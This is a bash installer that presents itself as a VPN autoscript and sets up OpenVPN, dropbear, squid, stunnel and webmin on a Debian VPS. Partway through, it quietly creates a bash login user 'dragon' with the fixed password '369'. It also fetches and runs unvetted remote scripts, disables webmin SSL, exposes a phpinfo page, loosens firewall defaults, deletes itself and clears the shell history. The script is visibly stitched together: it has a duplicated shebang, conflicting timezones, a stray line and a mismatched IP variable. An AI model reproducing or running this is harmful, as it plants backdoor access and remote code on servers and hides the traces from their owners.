#!/bin/bash
# ******************************************
#!/bin/bash
# R3V1V3R
# 1NT3RN3T
# L1VR3

corPadrao="\033[0m"
preto="\033[0;30m"
vermelho="\033[0;31m"
verde="\033[0;32m"
marrom="\033[0;33m"
azul="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
cinzaClaro="\033[0;37m"
pretoCinza="\033[1;30m"
vermelhoClaro="\033[1;31m"
verdeClaro="\033[1;32m"
amarelo="\033[1;33m"
azulClaro="\033[1;34m"
purpleClaro="\033[1;35m"
cyanClaro="\033[1;36m"
branco="\033[1;37m"
clear
echo -e "\033[1;30m------------------------------------------------\033[1;37m"
echo -e "               .                                "
echo -e "           .XG@B@@1                             "  
echo -e "           @B@@@B@                              "
echo -e "           B@B@B@M          ,,::i.              "
echo -e "           @B@BOO@qi       iLPSF5X:             "
echo -e "           B@Bri2B@B@:    PB@Bkri7v,            "    
echo -e "           @B@     7@Z   :BN                    "
echo -e "           B@B@ii:  :B0  .7 .i77i.P:            "
echo -e "           @B:7GB@M7B@@,    k@B@XrBS            "
echo -e "           B0       @B@r                        "
echo -e "           @L      8B@B:                        " 
echo -e "           XO     @B@B@      ,.                 "
echo -e "           :B.j0Pii7G@B  .;   :7FSX.            "
echo -e "            @:LB@:   .@B@@r   .BMB.             "
echo -e "            .@.jiBB@B@@:.@B@B@B:L7              " 
echo -e "             :@v5   .:.   .:.  uX               "
echo -e "              .@2F    :Jij    EL                "
echo -e "                MNL    @@J  ,k.                 "
echo -e "                 UBv   @BE .U                   "
echo -e "                  :E7 .B@B .                    "
echo -e "                    i  @Br                      "
echo -e "                       @                        " 
echo -e "                                                "  
echo -e "------------------------------------------------\033[0m"

sleep 5

tput setaf 8 ; tput setab 5 ; tput bold ; printf '%30s%s%-18s\n' "R3V1V3R" ; tput sgr0
echo ""
echo ""
echo -e "\033[1;34m INSTALANDO...\033[1;32m"

sleep 5

export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(wget -qO- ipv4.icanhazip.com);
MYIP2="s/xxxxxxxxx/$MYIP/g";

# go to root
cd
cat /etc/[A-Za-z]*[_-][rv]e[lr]* ;
sleep 5

# stop/remove services
killall apache2
apt-get purge apache2 -y
apt-get -y --purge remove samba*
apt-get -y --purge remove exim4*
apt-get -y --purge remove sendmail*
apt-get -y --purge remove bind9*

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

# install wget, sudo and curl
apt-get update;apt-get -y install wget sudo curl;
apt install dos2unix

# set time GMT -3
ln -fs /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime



# set repo
wget -O /etc/apt/sources.list "https://raw.githubusercontent.com/redeviver/script/master/sources.list.debian8"
wget "http://www.dotdeb.org/dotdeb.gpg"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -

# update
apt-get update

# install webserver
apt-get -y install nginx


# install neofetch
echo "deb http://dl.bintray.com/dawidd6/neofetch jessie main" | tee -a /etc/apt/sources.list
curl "https://bintray.com/user/downloadSubjectPublicKey?username=bintray"| apt-key add -
apt-get update
apt-get install neofetch

echo "deb http://dl.bintray.com/dawidd6/neofetch jessie main" | tee -a /etc/apt/sources.list
curl "https://bintray.com/user/downloadSubjectPublicKey?username=bintray"| apt-key add -
apt-get update
apt-get install neofetch
echo "clear" >> .bash_profile
echo "menu" >> .bash_profile
clear
echo "START AUTOSCRIPT"
clear
echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "
ENABLE IPV4 AND IPV6

COMPLETE 1%
"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear
echo "
REMOVE SPAM PACKAGE

COMPLETE 10%
"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
echo "
UPDATE AND UPGRADE PROCESS

PLEASE WAIT TAKE TIME 1-5 MINUTE
"
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - https://gist.githubusercontent.com/enoch85/092c8f4c4f5127b99d40/raw/186333393163b7e0d50c8d3b25cae4d63ac78b22/jcameron-key.asc | apt-key add -
#wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
apt-get update;
apt-get -y autoremove;
apt-get -y install wget curl;
echo "
INSTALLER PROCESS PLEASE WAIT

TAKE TIME 5-10 MINUTE 
"

# fail2ban & exim & protection
apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
#wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
#cd ddos-deflate-master && ./install.sh
wget https://github.com/jgmdev/ddos-deflate/archive/master.zip
unzip master.zip
cd ddos-deflate-master
./install.sh
service exim4 stop;sysv-rc-conf exim4 off;

# webmin
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf

# ssh
sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
wget -O /etc/issue.net "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/banner"

# dropbear
apt-get -y install dropbear
wget -O /etc/default/dropbear "https://raw.githubusercontent.com/KeningauVPS/sslmode/master/dropbear"
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells

# install squid3
wget  -O /bin/sq3 -o /dev/null https://raw.githubusercontent.com/redeviver/ovpn/master/sq3
chmod +x /bin/sq3
sleep 1
sq3



 nginx
apt-get -y install nginx php5-fpm php5-cli libexpat1-dev libxml-parser-perl
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/zero9911/a/master/script/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Setup by Dragon96 | telegram @ranger_9699 | whatsapp +60162327524</pre>" > /home/vps/public_html/index.php
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/zero9911/a/master/script/vps1.conf"
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
cd




# Install Vnstat GUI
cd /home/vps/public_html/
wget http://www.sqweek.com/sqweek/files/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
cd


# install stunnel4
apt-get -y install stunnel4
wget -O /etc/stunnel/stunnel.pem "https://raw.githubusercontent.com/ZENON-VPN/autoscript/master/updates/stunnel.pem"
wget -O /etc/stunnel/stunnel.conf "https://raw.githubusercontent.com/ZENON-VPN/autoscript/master/req/stunnel.conf"
sed -i $MYIP2 /etc/stunnel/stunnel.conf
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
service stunnel4 restart

# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/client.ovpn"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
cd;wget https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash dragon
echo "dragon:369" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear

#Setting USW
apt-get install ufw
ufw allow ssh
ufw allow 1194/tcp
sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
cat > /etc/ufw/before.rules <<-END
# START OPENVPN RULES
# NAT table rules
*nat
:POSTROUTING ACCEPT [0:0]
# Allow traffic from OpenVPN client to eth0
-A POSTROUTING -s 10.8.0.0/8 -o eth0 -j MASQUERADE
COMMIT
# END OPENVPN RULES
END
ufw enable
ufw status
ufw disable

# download script
cd /usr/bin
wget https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/setup
chmod +x setup
./setup

# restart service
service ssh restart
service openvpn restart
service dropbear restart
service nginx restart
service php5-fpm restart
service webmin restart
service squid3 restart
service squid restart
service fail2ban restart
clear

# END SCRIPT ( guardeumvpn.tk )
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript VPS (guardeumvpn.ml)"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo "Powered By DISASTERMASTER → Call, Whatsapp, Telegram : @guardeumvpn"  | tee -a log-install.txt
echo "nginx : http://$myip:80"   | tee -a log-install.txt
echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
echo "OpenVPN  : UDP 1194 (client config : http://$myip/client.ovpn)"  | tee -a log-install.txt
echo "OpenVPN  : TCP 53 (client config : http://$myip/client1.ovpn)"  | tee -a log-install.txt
echo "Squid : 8080"  | tee -a log-install.txt
echo "OpenSSH : 22"  | tee -a log-install.txt
echo "Dropbear : 443"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "AntiDDOS : [on]"  | tee -a log-install.txt
echo "AntiTorrent : [on]"  | tee -a log-install.txt
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
echo "Menu : Type "menu" To Check Menu Script"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"
echo "LOG INSTALL  --> /root/log-install.txt"
echo "----------------------------------------"
echo "========================================"  | tee -a log-install.txt
echo "      PLEASE REBOOT TAKE EFFECT !"
echo "========================================"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
